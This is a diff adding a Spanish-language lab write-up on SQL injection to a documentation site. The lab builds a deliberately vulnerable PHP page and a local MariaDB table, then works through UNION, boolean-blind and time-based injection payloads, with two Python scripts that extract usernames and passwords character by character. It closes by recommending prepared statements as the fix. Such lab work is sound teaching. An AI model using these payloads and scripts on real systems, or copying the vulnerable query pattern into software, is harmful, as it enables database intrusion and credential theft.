@@ -69,6 +69,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#parte-1-explicacion-sql-injection" class="md-skip">
+          Saltar a contenido
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -530,6 +535,149 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#parte-1-explicacion-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 1, explicación SQL Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Parte 1, explicación SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-inyeccion-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tipos de inyección SQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-bases-de-datos-y-su-relacion-con-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tipos de bases de datos y su relación con SQLI
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-2-creacion-de-base-de-datos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 2, creación de base de datos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-3-establecer-pagina-web" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 3, establecer página web
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-4-consultas-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 4, consultas SQLI
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-5-sanitizacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 5, sanitización
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-6-manejo-de-errores-e-inyeccion-basada-en-booleanos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 6, manejo de errores e inyección basada en booleanos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-7-sqli-a-ciegas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 7, SQLI a ciegas
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Parte 7, SQLI a ciegas">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#script-de-automatizacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script de automatización
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-8-sqli-basado-en-tiempo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 8, SQLI basado en tiempo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Parte 8, SQLI basado en tiempo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#script-modificado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script modificado
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parte-9-conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parte 9, Conclusión
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -546,6 +694,428 @@
 
   <h1>Vulnerabilidad   SQL Injection (SQLi)</h1>
 
+<h2 id="parte-1-explicacion-sql-injection">Parte 1, explicación SQL Injection</h2>
+<p>SQL Injection (SQLI) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que no validan adecuadamente la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.</p>
+<p>Las inyecciones SQL se producen cuando se inserta código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida ni sanitiza adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecuta directamente en la base de datos, permitiendo al atacante obtener información confidencial o incluso controlar la base de datos.</p>
+<h3 id="tipos-de-inyeccion-sql">Tipos de inyección SQL</h3>
+<ul>
+<li><strong>Basada en errores</strong>: aprovecha los mensajes de error que devuelve el motor de base de datos para obtener información adicional del sistema (nombres de tablas, columnas, versión, etc).</li>
+<li><strong>Basada en tiempo</strong>: utiliza funciones que retrasan la respuesta del servidor (como <code>sleep()</code>) para inferir información en función de cuánto tarda en responder la petición, sin necesidad de ver ningún dato en pantalla.</li>
+<li><strong>Basada en booleanos</strong>: utiliza expresiones lógicas verdadero/falso dentro de la consulta para deducir información según cómo cambia la respuesta de la aplicación (por ejemplo, si existe o no un registro).</li>
+<li><strong>Basada en uniones (UNION)</strong>: utiliza la cláusula <code>UNION</code> para combinar el resultado de la consulta original con otra consulta arbitraria, permitiendo extraer datos de otras tablas.</li>
+<li><strong>Basada en stacked queries</strong>: aprovecha la posibilidad de ejecutar múltiples sentencias SQL separadas por <code>;</code> en una sola petición, permitiendo ejecutar consultas adicionales (inserciones, actualizaciones, etc).</li>
+</ul>
+<h3 id="tipos-de-bases-de-datos-y-su-relacion-con-sqli">Tipos de bases de datos y su relación con SQLI</h3>
+<ul>
+<li><strong>Relacionales</strong> (MySQL/MariaDB, SQL Server, Oracle, PostgreSQL): son las más afectadas por SQLI, ya que utilizan directamente el lenguaje SQL para todas sus consultas.</li>
+<li><strong>NoSQL</strong> (MongoDB, Cassandra): no usan SQL, pero pueden sufrir variantes como la inyección de comandos/operadores propios de su lenguaje de consulta (NoSQL Injection).</li>
+<li><strong>De grafos</strong> (Neo4j): pueden ser vulnerables si no se sanitizan las consultas hacia sus nodos y relaciones.</li>
+<li><strong>De objetos</strong> (db4o): también pueden ser vulnerables si las consultas hacia los objetos almacenados no se validan correctamente.</li>
+</ul>
+<p>La defensa principal contra SQLI consiste en validar y sanitizar toda entrada de usuario, y sobre todo en utilizar <strong>consultas preparadas (prepared statements)</strong> en lugar de concatenar strings directamente en la consulta SQL.</p>
+<p>En este laboratorio se monta un entorno vulnerable de forma intencional (base de datos + página PHP) para practicar la explotación manual de SQLI, desde consultas básicas hasta técnicas a ciegas y basadas en tiempo.</p>
+<hr />
+<h2 id="parte-2-creacion-de-base-de-datos">Parte 2, creación de base de datos</h2>
+<p>Se iniciaron los servicios de MariaDB (mysql) y Apache2 necesarios para levantar el entorno vulnerable:</p>
+<pre><code class="language-bash">service mysql start
+service apache2 start
+</code></pre>
+<p>Posteriormente se creó la base de datos <code>SQLI</code> y dentro de ella la tabla <code>users</code>, compuesta por los campos <code>id</code> (int), <code>username</code> (varchar) y <code>password</code> (varchar). Se insertaron 3 registros de prueba, simulando credenciales de distintos usuarios del sistema.</p>
+<p><img alt="SQLI_CreacionBD" src="../SQLI_CreacionBD.png" /></p>
+<p>Como se observa en la imagen, la tabla <code>users</code> quedó con la siguiente estructura y contenido:</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>admin123$!p@$$</td>
+</tr>
+<tr>
+<td>2</td>
+<td>FabCA06</td>
+<td>FABRICIO06</td>
+</tr>
+<tr>
+<td>3</td>
+<td>NaruGOD</td>
+<td>prueba</td>
+</tr>
+</tbody>
+</table>
+<p>Esta base de datos es la que la aplicación PHP consultará en cada búsqueda, y será el objetivo de todo el laboratorio.</p>
+<hr />
+<h2 id="parte-3-establecer-pagina-web">Parte 3, establecer página web</h2>
+<p>Para exponer la vulnerabilidad a través de una aplicación web, se creó el archivo <code>searchUsers.php</code> dentro de <code>/var/www/html</code>, con conexión directa a la base de datos <code>SQLI</code> usando el usuario <code>FabCA06</code>.</p>
+<pre><code class="language-php">&lt;?php
+
+  $server = &quot;localhost&quot;;
+  $username = &quot;FabCA06&quot;;
+  $password = &quot;FABRICIO06&quot;;
+  $database = &quot;SQLI&quot;;
+
+    // Conexion
+  $conn = new mysqli($server, $username, $password, $database);
+
+  $id = $_GET['id'];
+
+// Query
+  $data = mysqli_query($conn, &quot;select username from users where id = '$id'&quot;);
+
+  if (!$data) {
+    $error_msg = mysqli_error($conn);
+    // Si el error contiene 'ORDER BY', lo cambiamos por el texto clásico 'order clause (como me paso a mi)'
+    $classic_error = str_replace(&quot;'ORDER BY'&quot;, &quot;'order clause'&quot;, $error_msg);
+    die(&quot;Fatal error: Uncaught mysqli_sql_exception: &quot; . $classic_error);
+  }
+
+  echo &quot;[+] Tu valor introducido es: &quot; . $id . &quot;&lt;br&gt;--------------------------------&lt;br&gt;&quot;;
+
+  $response = mysqli_fetch_array($data);
+
+  echo $response['username'];
+
+?&gt;
+</code></pre>
+<p>El script recibe un parámetro <code>id</code> por GET y lo concatena <strong>directamente</strong>, sin ningún tipo de sanitización, dentro de la consulta SQL:</p>
+<pre><code class="language-sql">select username from users where id = '$id'
+</code></pre>
+<p>Esto es precisamente lo que hace a la aplicación vulnerable: como el valor de <code>$id</code> proviene sin filtrar de la URL, cualquier carácter especial de SQL (como una comilla simple <code>'</code>) que el atacante envíe se interpretará como parte de la consulta y no como un simple dato, permitiendo alterar la lógica de la sentencia SQL. Además, el script muestra en pantalla tanto el valor introducido como el mensaje de error de MySQL en caso de fallo, lo cual facilita enormemente la explotación (esto se conoce como una aplicación con "salida verbosa" o <em>error-based friendly</em>).</p>
+<hr />
+<h2 id="parte-4-consultas-sqli">Parte 4, consultas SQLI</h2>
+<p>Con la página ya vulnerable, se realizaron las primeras pruebas manuales para confirmar y explotar la inyección:</p>
+<p><strong>Confirmar la inyección con una comilla simple:</strong></p>
+<p><code>http://localhost/searchUsers.php?id=1';</code></p>
+<pre><code>Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in /var/www/html/searchUsers.php:13 Stack trace: #0 /var/www/html/searchUsers.php(13): mysqli_query() #1 {main} thrown in /var/www/html/searchUsers.php on line 13
+</code></pre>
+<p>Se obtiene un error de sintaxis SQL, lo cual confirma que el parámetro <code>id</code> no está siendo sanitizado y que se puede romper la consulta original.</p>
+<p><strong>Determinar el número de columnas con <code>ORDER BY</code>:</strong></p>
+<p><code>http://localhost/searchUsers.php?id=1' order by 100;-- -;'</code></p>
+<pre><code>Fatal error: Uncaught mysqli_sql_exception: Unknown column '100' in 'ORDER BY' in /var/www/html/searchUsers.php:13 Stack trace: #0 /var/www/html/searchUsers.php(13): mysqli_query() #1 {main} thrown in /var/www/html/searchUsers.php on line 13
+</code></pre>
+<p>Devuelve un error de columna desconocida, indicando que la tabla no tiene 100 columnas.</p>
+<p><code>http://localhost/searchUsers.php?id=1' order by 1;-- -;</code></p>
+<pre><code>admin
+</code></pre>
+<p>Esta sí funciona y devuelve <code>admin</code>, confirmando que la consulta original solo maneja <strong>1 columna</strong> (<code>username</code>). Este paso es clave antes de usar <code>UNION</code>, ya que el número de columnas de ambas consultas debe coincidir.</p>
+<p><strong>Confirmar el número de columnas con <code>UNION SELECT</code>:</strong></p>
+<p><code>http://localhost/searchUsers.php?id=1' union select 1,2-- -</code></p>
+<pre><code>Fatal error: Uncaught mysqli_sql_exception: The used SELECT statements have a different number of columns in /var/www/html/searchUsers.php:13 Stack trace: #0 /var/www/html/searchUsers.php(13): mysqli_query() #1 {main} thrown in /var/www/html/searchUsers.php on line 13
+</code></pre>
+<p>Devuelve un error de "different number of columns", confirmando (junto con el <code>ORDER BY</code>) que la consulta original solo tiene 1 columna.</p>
+<p><code>http://localhost/searchUsers.php?id=81242211' union select 1-- -</code></p>
+<pre><code>1
+</code></pre>
+<p>Al usar un <code>id</code> inexistente (para que la primera parte de la consulta no devuelva nada) y una sola columna en el <code>UNION</code>, se logra inyectar el valor <code>1</code> directamente en la salida.</p>
+<p><strong>Extracción de información mediante <code>UNION SELECT</code> e <code>information_schema</code>:</strong></p>
+<p>A partir de aquí se abusa de la base de datos <code>information_schema</code>, que en MariaDB/MySQL almacena metadatos de todas las bases de datos, tablas y columnas del servidor:</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select database()-- -</code></p>
+<pre><code>SQLI
+</code></pre>
+<p>Revela el nombre de la base de datos actual.</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select schema_name from information_schema.schemata-- -</code></p>
+<pre><code>information_schema
+</code></pre>
+<p>Lista las bases de datos existentes en el servidor (solo se muestra la primera fila, ya que la consulta original solo espera un resultado).</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select schema_name from information_schema.schemata limit 0,1-- -</code></p>
+<pre><code>information_schema
+</code></pre>
+<p>Con <code>limit 0,1</code> se controla explícitamente qué fila se extrae.</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select group_concat(schema_name) from information_schema.schemata-- -</code></p>
+<pre><code>information_schema,SQLI
+</code></pre>
+<p>Usando <code>group_concat</code> se concatenan todas las bases de datos en una sola fila, evitando tener que iterar con <code>limit</code>.</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select group_concat(table_name) from information_schema.tables where table_schema='SQLI'-- -</code></p>
+<pre><code>users
+</code></pre>
+<p>Lista las tablas de la base <code>SQLI</code>.</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select group_concat(column_name) from information_schema.columns where table_schema='SQLI' and table_name='users'-- -</code></p>
+<pre><code>id,username,password
+</code></pre>
+<p>Lista todas las columnas de la tabla <code>users</code> de una sola vez.</p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select column_name from information_schema.columns where table_schema='SQLI' and table_name='users'-- -</code></p>
+<pre><code>id
+</code></pre>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select column_name from information_schema.columns where table_schema='SQLI' and table_name='users' limit 0,1-- -</code></p>
+<pre><code>id
+</code></pre>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select column_name from information_schema.columns where table_schema='SQLI' and table_name='users' limit 1,1-- -</code></p>
+<pre><code>username
+</code></pre>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select column_name from information_schema.columns where table_schema='SQLI' and table_name='users' limit 2,1-- -</code></p>
+<pre><code>password
+</code></pre>
+<p>Con <code>limit 0,1</code>, <code>limit 1,1</code> y <code>limit 2,1</code> se extraen las columnas una por una, útil cuando <code>group_concat</code> no está disponible o se quiere depurar el proceso manualmente.</p>
+<p><strong>Extracción de las credenciales:</strong></p>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select group_concat(username) from users-- -</code></p>
+<pre><code>admin,FabCA06,NaruGOD
+</code></pre>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select group_concat(password) from users-- -</code></p>
+<pre><code>admin123$!p@$$,FABRICIO06,prueba
+</code></pre>
+<p><code>http://localhost/searchUsers.php?id=1174904' union select group_concat(username,':',password) from users-- -</code></p>
+<pre><code>admin:admin123$!p@$$,FabCA06:FABRICIO06,NaruGOD:prueba
+</code></pre>
+<p>Con esto se logró extraer usuarios y contraseñas completas de la base de datos utilizando únicamente inyección basada en <code>UNION</code>.</p>
+<p><strong>Confirmar inyección basada en tiempo:</strong></p>
+<p><code>http://localhost/searchUsers.php?id=1' and sleep(5)-- -</code></p>
+<pre><code>(Se esperó 5 segundos)
+</code></pre>
+<p>La respuesta tardó 5 segundos, confirmando que también es posible explotar la vulnerabilidad sin depender de la salida en pantalla (esto se retoma más a fondo en la Parte 8).</p>
+<hr />
+<h2 id="parte-5-sanitizacion">Parte 5, sanitización</h2>
+<p>Se aplicó una primera medida de mitigación utilizando la función <code>mysqli_real_escape_string()</code>, que escapa los caracteres especiales de SQL (como la comilla simple) antes de insertarlos en la consulta:</p>
+<pre><code class="language-php">  // Sanitizacion
+  $id = mysqli_real_escape_string($conn, $_GET['id']);
+
+  echo &quot;[+] Tu valor introducido es: &quot; . $id . &quot;&lt;br&gt;--------------------------------&lt;br&gt;&quot;;
+</code></pre>
+<p>Al probar de nuevo la inyección:</p>
+<p><code>http://localhost/searchUsers.php?id=1' union select 1-- -</code></p>
+<pre><code>[+] Tu valor introducido es: 1\' union select 1-- -
+--------------------------------
+admin
+</code></pre>
+<p>Se observa que la comilla simple fue escapada automáticamente (<code>\'</code>), por lo que ya no rompe la consulta SQL; el <code>union select</code> se trata como texto literal y la consulta original simplemente devuelve el usuario con <code>id = 1</code>.</p>
+<p><code>http://localhost/searchUsers.php?id=9' union select 1-- -</code></p>
+<pre><code>[+] Tu valor introducido es: 9\' union select 1-- -
+--------------------------------
+
+Warning: Trying to access array offset on null in /var/www/html/searchUsers.php on line 27
+</code></pre>
+<p>Al no existir ningún usuario con <code>id = 9</code>, la consulta no devuelve resultados y aparece una advertencia de PHP (<code>Trying to access array offset on null</code>), ya que el script intenta acceder a un índice de un arreglo vacío. Esto confirma que la inyección quedó neutralizada, aunque expone un nuevo problema: el manejo de errores de PHP sigue mostrando información de depuración.</p>
+<hr />
+<h2 id="parte-6-manejo-de-errores-e-inyeccion-basada-en-booleanos">Parte 6, manejo de errores e inyección basada en booleanos</h2>
+<p>Se realizó una segunda iteración del script, endureciendo el manejo de la respuesta: se eliminaron los <code>echo</code> que reflejaban el valor introducido por el usuario (para no dar pistas al atacante) y se agregó una validación con <code>isset()</code> para controlar el caso en que no se encuentre ningún usuario, devolviendo un código de estado HTTP apropiado en lugar de un warning de PHP:</p>
+<pre><code class="language-php">&lt;?php
+
+  $server = &quot;localhost&quot;;
+  $username = &quot;FabCA06&quot;;
+  $password = &quot;FABRICIO06&quot;;
+  $database = &quot;SQLI&quot;;
+
+  // Conexion a la base de datos
+  $conn = new mysqli($server, $username, $password, $database);
+
+  // Sanitizacion
+  $id = mysqli_real_escape_string($conn, $_GET['id']);
+
+  $data = mysqli_query($conn, &quot;select username from users where id = '$id'&quot;);
+
+  $response = mysqli_fetch_array($data);
+
+  if (!isset($response['username'])) {
+      http_response_code(404);
+  } else {
+      echo $response['username'];
+  }
+
+?&gt;
+</code></pre>
+<p>Con la sanitización aún activa, se probó una inyección basada en booleanos usando subconsultas para comparar carácter por carácter el <code>username</code>:</p>
+<p><code>http://localhost/searchUsers.php?id=1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id = 1) = 'a'-- -</code></p>
+<pre><code>admin
+</code></pre>
+<p>Devuelve <code>admin</code>, porque la condición es verdadera (el primer carácter del username con <code>id=1</code> es efectivamente <code>a</code>).</p>
+<p><code>http://localhost/searchUsers.php?id=1' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id = 1) = 97-- -</code></p>
+<pre><code>admin
+</code></pre>
+<p>También devuelve <code>admin</code>, usando el código ASCII (97 = 'a') en lugar del carácter directo. Esta segunda forma es la que después se automatiza en el script de fuerza bruta, ya que trabajar con valores ASCII numéricos es más sencillo de iterar en un bucle que con caracteres literales.</p>
+<p>Después de estas pruebas se <strong>eliminó la sanitización</strong> para volver a dejar el endpoint vulnerable y así poder practicar SQL Injection a ciegas en las siguientes partes.</p>
+<hr />
+<h2 id="parte-7-sqli-a-ciegas">Parte 7, SQLI a ciegas</h2>
+<p>En este punto se modificó la página para que <strong>no muestre ningún output visible</strong>, simulando un escenario más realista donde el atacante no puede ver directamente los datos ni los mensajes de error, sino que solo puede inferir información a partir del comportamiento de la aplicación (en este caso, el código de estado HTTP):</p>
+<pre><code class="language-php">&lt;?php
+
+  $server = &quot;localhost&quot;;
+  $username = &quot;FabCA06&quot;;
+  $password = &quot;FABRICIO06&quot;;
+  $database = &quot;SQLI&quot;;
+
+  // Conexion a la base de datos
+  $conn = new mysqli($server, $username, $password, $database);
+
+  // Sanitizacion
+  //$id = mysqli_real_escape_string($conn, $_GET['id']);
+  $id = $_GET['id'];
+
+
+  $data = mysqli_query($conn, &quot;select username from users where id = '$id'&quot;);
+
+  $response = mysqli_fetch_array($data);
+
+  if (!isset($response['username'])) {
+    http_response_code(404);
+    exit();
+  } else {
+    http_response_code(200);
+    exit();
+  }
+
+?&gt;
+</code></pre>
+<p>Ahora la aplicación es un simple oráculo booleano: devuelve <strong>200</strong> si la condición de la subconsulta es verdadera, o <strong>404</strong> si es falsa. Esto es exactamente lo que se necesita para hacer SQLI a ciegas basada en booleanos.</p>
+<p>Se verifica el comportamiento usando <code>curl</code> para inspeccionar únicamente las cabeceras (<code>-I</code>) y el status code:</p>
+<pre><code class="language-bash">❯ curl -s -I -X get &quot;http://localhost/searchUsers.php&quot; -G --data-urlencode &quot;id=9' or (select ascii(substring(username,1,1)) from users where id = 1) = 97-- -&quot;
+
+HTTP/1.1 200 OK
+...
+</code></pre>
+<pre><code class="language-bash">❯ curl -s -I -X get &quot;http://localhost/searchUsers.php&quot; -G --data-urlencode &quot;id=9' or (select ascii(substring(username,1,1)) from users where id = 1) = 98-- -&quot;
+
+HTTP/1.1 404 Not Found
+...
+</code></pre>
+<p>Al usar <code>id=9</code> (que no existe) junto con un <code>OR</code>, la única forma de que la consulta devuelva una fila es que la condición inyectada sea verdadera. Esto permite comprobar carácter por carácter, usando su valor ASCII, si el dato extraído coincide con el valor probado.</p>
+<h3 id="script-de-automatizacion">Script de automatización</h3>
+<p>A partir de esta lógica se construyó un script en Python que automatiza el proceso de fuerza bruta carácter por carácter:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+import requests
+import signal
+import sys
+import time
+import string
+from pwn import *
+
+def def_handler(sig, frame):
+    print(&quot;\n\n[!] Saliendo...\n&quot;)
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = &quot;http://localhost/searchUsers.php&quot;
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress(&quot;Fuerza bruta&quot;)
+    p1.status(&quot;Iniciando proceso de fuerza bruta&quot;)
+
+    time.sleep(2)
+
+    p2 = log.progress(&quot;Datos extraídos&quot;)
+
+    extracted_info = &quot;&quot;
+
+    for position in range(1, 150):
+        for character in range(33, 126):
+            sqli_url = main_url + &quot;?id=9' OR (SELECT ASCII(SUBSTRING((select group_concat(username,0x3A,password) from users), %d, 1))) = %d-- -&quot; % (position, character)
+
+            p1.status(&quot;Probando posición %d con carácter %s&quot; % (position, chr(character)))
+
+            r = requests.get(sqli_url)
+
+            if r.status_code == 200:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ == '__main__':
+
+    makeSQLI()
+</code></pre>
+<p><strong>Lógica del script:</strong></p>
+<ol>
+<li>Se recorre cada posición de un string desde 1 hasta 150 (rango suficiente para cubrir todos los usuarios y contraseñas concatenados).</li>
+<li>Para cada posición, se prueban los códigos ASCII imprimibles del 33 al 126 (excluye espacios y caracteres de control).</li>
+<li>La consulta inyectada compara el carácter en esa posición del resultado de <code>group_concat(username,0x3A,password)</code> (todos los usuarios y contraseñas concatenados, separados por <code>:</code>, representado en hexadecimal como <code>0x3A</code> para evitar problemas con la comilla) contra el valor ASCII probado.</li>
+<li>Si el servidor responde con status <strong>200</strong>, significa que la comparación fue verdadera: ese es el carácter correcto en esa posición, se agrega al resultado y se pasa a la siguiente posición.</li>
+<li>Se usa la librería <code>pwntools</code> (<code>log.progress</code>) únicamente para mostrar el avance del ataque en consola de forma más visual, no forma parte de la lógica de extracción.</li>
+</ol>
+<p><strong>Resultado obtenido:</strong></p>
+<pre><code>❯ python3 sqli.py
+[&gt;] Fuerza bruta: Probando posición 149 con carácter }
+[.] Datos extraídos: admin:admin123$!p@$$,FabCA06:FABRICIO06,NaruGOD:prueba
+</code></pre>
+<p>El script logró reconstruir automáticamente, carácter por carácter y sin ver ningún dato en pantalla, las mismas credenciales que se habían extraído manualmente en la Parte 4.</p>
+<hr />
+<h2 id="parte-8-sqli-basado-en-tiempo">Parte 8, SQLI basado en tiempo</h2>
+<p>La inyección a ciegas basada en booleanos depende de que la aplicación tenga alguna diferencia observable (como el status code) entre una condición verdadera y una falsa. Cuando ni siquiera existe esa diferencia (por ejemplo, la aplicación siempre responde igual sin importar el resultado de la consulta), se puede recurrir a la <strong>inyección basada en tiempo</strong>, que usa la duración de la respuesta como el único canal de información.</p>
+<p>Primero se probó el comportamiento directamente en la consola de MariaDB, usando la función <code>sleep()</code> dentro de un <code>IF()</code>:</p>
+<pre><code>MariaDB [SQLI]&gt;  select * from users where id = 1 and if(substr(database(),1,1)='a',sleep(5),1);
++------+----------+----------------+
+| id   | username | password       |
++------+----------+----------------+
+|    1 | admin    | admin123$!p@$$ |
++------+----------+----------------+
+1 row in set (0.001 sec)
+</code></pre>
+<p>Como el primer carácter de <code>database()</code> (<code>SQLI</code>) no es <code>'a'</code>, la condición es falsa y la consulta responde de inmediato.</p>
+<pre><code>MariaDB [SQLI]&gt;  select * from users where id = 1 and if(substr(database(),1,1)='S',sleep(5),1);
+Empty set (5.001 sec)
+</code></pre>
+<p>Aquí la condición sí es verdadera (<code>S</code> es el primer carácter de <code>SQLI</code>), por lo que se ejecuta <code>sleep(5)</code> y la respuesta tarda 5 segundos, confirmando el carácter sin necesidad de ver ningún dato de salida.</p>
+<h3 id="script-modificado">Script modificado</h3>
+<p>Se adaptó el script de la Parte 7, reemplazando la condición basada en status code por una condición basada en tiempo de respuesta:</p>
+<pre><code class="language-python"># Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = &quot;http://localhost/searchUsers.php&quot;
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress(&quot;Fuerza bruta&quot;)
+    p1.status(&quot;Iniciando proceso de fuerza bruta&quot;)
+
+    time.sleep(2)
+
+    p2 = log.progress(&quot;Datos extraídos&quot;)
+
+    extracted_info = &quot;&quot;
+
+    for position in range(1, 150):
+        for character in range(33, 126):
+            # AJUSTE SQL: Subimos el sleep a 1 segundo para ganarle al ruido de la red
+            sqli_url = main_url + &quot;?id=1' and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(1),1)-- -&quot; % (position, character)
+
+            # AJUSTE VISUAL: Texto corto para no romper las dos líneas en consola
+            p1.status(&quot;Probando posición %d con carácter %s&quot; % (position, chr(character)))
+
+            time_start = time.time()
+
+            r = requests.get(sqli_url)
+
+            time_end = time.time()
+
+            # AJUSTE LOGICA: Si la respuesta tardó 1 segundo o más, es un acierto seguro
+            if time_end - time_start &gt;= 1:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ == '__main__':
+
+    makeSQLI()
+</code></pre>
+<p><strong>Diferencias clave respecto al script de la Parte 7:</strong></p>
+<ul>
+<li>En lugar de revisar <code>r.status_code</code>, se mide manualmente el tiempo transcurrido entre el envío de la petición (<code>time_start</code>) y la recepción de la respuesta (<code>time_end</code>).</li>
+<li>La condición inyectada usa <code>if(condicion, sleep(1), 1)</code>: si la comparación de carácter es verdadera, la base de datos duerme 1 segundo antes de responder; si es falsa, responde de inmediato.</li>
+<li>Se usó un <code>sleep(1)</code> (en lugar de 5 segundos como en la prueba manual) para acelerar el proceso de fuerza bruta y reducir el tiempo total de ejecución, siempre y cuando la latencia de red sea lo suficientemente baja como para no generar falsos positivos.</li>
+<li>Un tiempo de respuesta <code>&gt;= 1</code> segundo se interpreta como un acierto, ya que en condiciones normales la petición debería resolverse en milisegundos.</li>
+</ul>
+<p><strong>Resultado obtenido:</strong></p>
+<pre><code>❯ python3 sqli.py
+[&lt;] Fuerza bruta: Probando posición 149 con carácter }
+[◤] Datos extraídos: admin:admin123$!p@$$,FabCA06:FABRICIO06,NaruGOD:prueba
+</code></pre>
+<p>Se obtuvieron exactamente las mismas credenciales que en las Partes 4 y 7, esta vez sin depender de ninguna diferencia visible en la respuesta (ni contenido, ni status code), únicamente del tiempo que tarda el servidor en responder.</p>
+<hr />
+<h2 id="parte-9-conclusion">Parte 9, Conclusión</h2>
+<p>A lo largo de este laboratorio se recorrió el ciclo completo de una vulnerabilidad de SQL Injection: desde su explotación más directa (inyección basada en <code>UNION</code>, con salida de errores y datos visibles en pantalla), pasando por medidas de mitigación parciales (sanitización con <code>mysqli_real_escape_string</code>, manejo de errores más cuidadoso), hasta escenarios donde la aplicación no revela ningún dato ni error, obligando a recurrir a técnicas de inyección a ciegas basadas en booleanos y, finalmente, basadas en tiempo.</p>
+<p>Este recorrido deja claro que <strong>eliminar la salida visible de errores no es suficiente para mitigar SQLI</strong>: mientras la entrada del usuario se siga concatenando directamente en la consulta SQL, la vulnerabilidad seguirá siendo explotable, simplemente requiere técnicas más lentas y elaboradas (como los scripts de fuerza bruta carácter por carácter usados en las Partes 7 y 8). La única mitigación realmente efectiva es el uso de <strong>consultas preparadas (prepared statements)</strong> con parámetros vinculados (<em>bound parameters</em>), en lugar de construir la consulta SQL mediante concatenación de strings, sin importar cuántas capas de sanitización o manejo de errores se agreguen encima.</p>
+<p><a href="../../E8%20-%20Vulnerabilidades%20y%20OWASP%20Top%2010/">⬅️ Volver a E8 - Vulnerabilidades y OWASP Top 10</a></p>
 
 
 
@@ -553,6 +1123,8 @@
 
 
 
+  
+  
 
 
 
